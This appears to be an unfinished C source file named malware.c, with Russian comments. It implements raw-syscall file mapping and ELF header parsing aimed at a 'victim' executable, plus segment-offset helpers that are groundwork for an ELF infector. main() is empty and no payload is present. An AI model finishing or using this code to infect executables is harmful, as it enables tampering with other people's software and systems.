/* Compile: gcc malware.c -o malware */
/* Usage: ./malware */
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>

/* ничем не отличается от структуры Elf64_Phdr, определенной в elf.h,
   но почему-то компиляторуоказывается неизвестен размер такой структуры,
   из-за чего возникают ошибки компиляции */

typedef struct Elf64_Phdr_str {
    unsigned int          p_type;       /* Segment type */
    unsigned int          p_flags;      /* Segment flags */
    unsigned long long    p_offset;     /* Segment file offset */
    unsigned long long    p_vaddr;      /* Segment virtual address */
    unsigned long long    p_paddr;      /* Segment physical address */
    unsigned long long    p_filesz;     /* Segment size in file */
    unsigned long long    p_memsz;      /* Segment size in memory */
    unsigned long long    p_align;      /* Segment alignment */
} Elf64_Phdr_str;

/* созданная по аналогичным причинам структура заголовка секции */
typedef struct Elf64_Shdr_str {
    unsigned int          sh_name;      /* Section name (string tbl index) */
    unsigned int          sh_type;      /* Section type */
    long long             sh_flags;     /* Section flags */
    unsigned long long    sh_addr;      /* Section virtual addr at execution */
    unsigned long long    sh_offset;        /* Section file offset */
    long long             sh_size;      /* Section size in bytes */
    unsigned int          sh_link;      /* Link to another section */
    unsigned int          sh_info;      /* Additional section information */
    long long             sh_addralign;     /* Section alignment */
    long long             sh_entsize;       /* Entry size if section holds table */
} Elf64_Shdr_str;

/* глобальные переменные для возвращаемых значений функций
   fopen, fread, open, read, close и mmap*/
/* это единственный способ присвоить возвращаемое ассемблерным кодом
   значение сишной переменной - даже если локальные переменные объявлены в куче,
   компилятор сначала кладет адрес переменной в стек,
   и только затем присваивает ему значение. Нам это не подходит, поскольку неизвестно,
   куда именно в стеке будет записан адрес, а взаимодествовать
   со стеком вслепую = получить segfault*/

void* return_mmap_ptr = NULL;
int return_open_fd;
int return_close_val;
int return_read_count;

/* хранит размер открытого эльфе-жертвы, нужен для fread */
long opened_file_size;

void print_elf_header_field(  Elf64_Ehdr* header_ptr );


/* вызывает stat */
void call_stat ( const char* path_name, struct stat *stat_struct ) {
    __asm__( "mov $4, %rax\n\t"
             "syscall\n\t");
}

/* вызывает mmap */
void* call_mmap ( void *address,
                  size_t length,
                  int protect,
                  int flags,
                  int filedes,
                  off_t offset ) {

    __asm__("push %rbx \n\t"
            "push %rcx \n\t"
            "push %rdx \n\t"
            "push %rbp \n\t"
            "push %r10 \n\t"
            "push %r14 \n\t"
            "push %r15 \n\t"

            "mov %r9, %r15 \n\t"
            "mov %rsi, %r13 \n\t"
            "mov %rdi, %r12 \n\t"
            "mov %ecx, %r14d \n\t"

            "movslq %r8d, %rbp \n\t"
            "movslq %edx, %rbx \n\t"
            "movslq %r14d, %r10 \n\t"
            "mov $0x9, %eax \n\t"

            "syscall \n\t"
            "movq %rax, return_mmap_ptr(%rip) \n\t"

            "pop %r15 \n\t"
            "pop %r14 \n\t"
            "pop %r10 \n\t"
            "pop %rbp \n\t"
            "pop %rdx \n\t"
            "pop %rcx \n\t"
            "pop %rbx \n\t"
            );

    return return_mmap_ptr;
}

/* вызывает open */
int call_open (const char *filename, int flags) {

    __asm__( "mov $2, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_open_fd(%rip) \n\t"
             );

    return return_open_fd;
}

/* вызывает close */
int call_close (unsigned int fd) {

    __asm__( "mov $3, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_close_val(%rip) \n\t");

    return return_close_val;
}

/* вызывает read */
int call_read (unsigned int fd, char *buf, size_t count) {

    __asm__( "mov $0, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_read_count(%rip) \n\t"
             );
    return return_read_count;
}

/* мой вариант fopen */
/* основное отличие от библиотечного fopen состоит в том,
   что мой не принимает флаги, поскольку у меня файлы всегда будут
   открываться на чтение или запись */
void* call_fopen ( const char *filename ) {
    int fd = call_open( filename, O_RDWR );

    if ( fd < 0 ) {
        printf("fopen: Не удалось открыть файл, ошибка № %d\n",
               errno);
        return NULL;
    }

    struct stat mystruct;
    call_stat( filename, &mystruct );

    opened_file_size = mystruct.st_size;
    /* маппим файл в память */
    void* ptr = call_mmap( NULL, opened_file_size,
                           PROT_READ|PROT_WRITE, MAP_SHARED,
                           fd, 0 );

    if ( ( ptr == MAP_FAILED ) || ( ptr < 0 ) ) {
        printf("fopen: Mapping Failed, err number %d \n",
               errno);
        printf("fopen: mmap returned bad pointer: %p\n", ptr);
        return NULL;
    }
    return ptr;
}
/* мой вариант memcpy */
void* call_memcpy(void* dest, void* source, size_t n ) {

    char* d = (char*)dest;
    char* s = (char*)source;

    for (int i = 0; i < n; i++ ) {
        *d = *s;
        d++;
        s++;
    }
}

void* call_fread ( void* ptr_sourse, size_t count, size_t bytes,
                   void* ptr_dest ) {

    long readed_bytes = 0;

    for( int i = 0; i < count; i++ ) {

        /* страховка, чтоб не прочитать больше, чем есть в файле */
        if( readed_bytes >= opened_file_size ) {
            return ptr_sourse;
        }

        /* memcpy( ptr_dest, ptr_sourse, bytes ); */
        call_memcpy( ptr_dest, ptr_sourse, bytes );

        ptr_dest = ptr_dest + bytes;
        ptr_sourse = ptr_sourse + bytes;
        readed_bytes = readed_bytes + bytes;
    }
    return ptr_sourse;
}

/* распечатывает все поля заголовка эльфа */
void print_elf_header_field(  Elf64_Ehdr* header_ptr ) {
    Elf64_Ehdr header = *header_ptr;

    printf("print elf header: \n");

    printf("header.e_type : %d\n", header.e_type);
    printf("header.e_machine : %d\n", header.e_machine);
    printf("header.e_version : %ud\n", header.e_version);
    printf("header.e_entry : %p\n", (void*)header.e_entry);
    printf("header.e_phoff : %lu\n", header.e_phoff);
    printf("header.e_shoff : %lu\n", header.e_shoff);
    printf("header.e_flags : %d\n", header.e_flags);
    printf("header.e_ehsize : %d\n", header.e_ehsize);
    printf("header.e_phentsize : %d\n", header.e_phentsize);
    printf("header.e_phnum : %d\n", header.e_phnum);
    printf("header.e_shentsize : %d\n", header.e_shentsize);
    printf("header.e_shnum : %d\n", header.e_shnum);
    printf("header.e_shstrndx : %d\n", header.e_shstrndx);

    printf("\n");
}

/* печатает все поля заголовка программы - заголовков самого исполняемого кода программы*/
void print_programm_header( Elf64_Phdr_str * programm_header_ptr ) {
    struct Elf64_Phdr_str programm_header = *programm_header_ptr;

    printf("print programm header: \n");

    printf("programm_header.p_type : %d \n", programm_header.p_type);
    printf("programm_header.p_flags : %d \n", programm_header.p_flags);
    printf("programm_header.p_offset : %llu \n", programm_header.p_offset);
    printf("programm_header.p_filesz : %llu \n", programm_header.p_filesz);
    printf("programm_header.p_memsz : %llu \n", programm_header.p_memsz);
    printf("programm_header.p_vaddr : %p \n \n",  (void*)programm_header.p_vaddr);
    printf("programm_header.p_paddr : %p \n \n",  (void*)programm_header.p_paddr);
    printf("programm_header.p_align : %llu \n", programm_header.p_align);

    printf("\n");
}

/* печатает все поля заголовка секции - весь код программы поделен на секции,
   у каждой есть заголовок */
void print_section_header( Elf64_Shdr_str *section_header_ptr ) {
    struct Elf64_Shdr_str section_header = *section_header_ptr;

    printf("print section header: \n");

    printf("section_header.sh_name : %d \n", section_header.sh_name);
    printf("section_header.sh_type : %d \n", section_header.sh_type);
    printf("section_header.sh_flags : %lld \n", section_header.sh_flags);

    printf("section_header.sh_offset : %llu \n", section_header.sh_offset);
    printf("section_header.sh_size : %llu \n", section_header.sh_size);

    printf("section_header.sh_addr : %p \n \n",  (void*)section_header.sh_addr);
    printf("section_header.sh_link : %d \n", section_header.sh_link);
    printf("section_header.sh_info : %d \n", section_header.sh_info);

    printf("section_header.sh_addralign : %lld \n", section_header.sh_addralign);
    printf("section_header.sh_entsize : %lld \n", section_header.sh_entsize);

    printf("\n");
}

/* читает заголовок эльфа из памяти  */
void read_elf_header( void* mmaped_file_ptr, Elf64_Ehdr* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Ehdr), header_struct );
}

/* читает заголовок секции из памяти  */
void read_section_header( void* mmaped_file_ptr, Elf64_Shdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Shdr_str), header_struct );
}

/* читает заголовок программы из памяти  */
void read_program_header( void* mmaped_file_ptr, Elf64_Phdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Phdr_str), header_struct );
}

/* позволяет пропустить заданное количество символов, сдвигая указатель  */
void* miss_symbols( void* mmaped_file_ptr, long n) {
    return mmaped_file_ptr + n;
}

/* прибавляет n байт к смещению в каждом заголовке программы */
Elf64_Phdr_str* add_offset_to_programs ( int n, unsigned long long offset,
                                         Elf64_Phdr_str* array ) {
    struct Elf64_Phdr_str header;
    for( int i = 0; i < n; i++) {
        header = array[i];
        header.p_offset = header.p_offset + offset;
        array[i] = header;
    }
}

/* выгружает все заголовки кода в массив */
Elf64_Phdr_str* get_program_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Phdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Phdr_str),
                array_headers );
    return array_headers;
}

/* ищет заголовок последнего сегмента в массиве заголовков */
/* последним сегментом считается тот, который находится дальше всех от начала файла и */
/* имеет смый большой размер */
Elf64_Phdr_str * find_last_segment( int n, Elf64_Phdr_str * headers_array,
                                    Elf64_Phdr_str * program_header_last_segment) {

    struct Elf64_Phdr_str program_header;

    for( int i = 0; i < n; i++) {
        program_header = headers_array[i];

        if (i == 0) {
            *program_header_last_segment = program_header;

        } else if ( ( (*program_header_last_segment).p_offset
                      <= program_header.p_offset ) &&
                    ( (*program_header_last_segment).p_filesz
                      <= program_header.p_filesz ) ) {

            *program_header_last_segment = program_header;
        }
    }
    return program_header_last_segment;
}

int main ( int argc, const char **argv ) {

    /* здесь будет объявление: */
    /*     - структора заголовка эльфа */
    /*     - структура заголовка программы */
    /*     - структура заголовка секции */
    /*     - массив заголовков программы */
    /* - структура для последнего заголовка последнего сегмента кода */
    return 0;
}
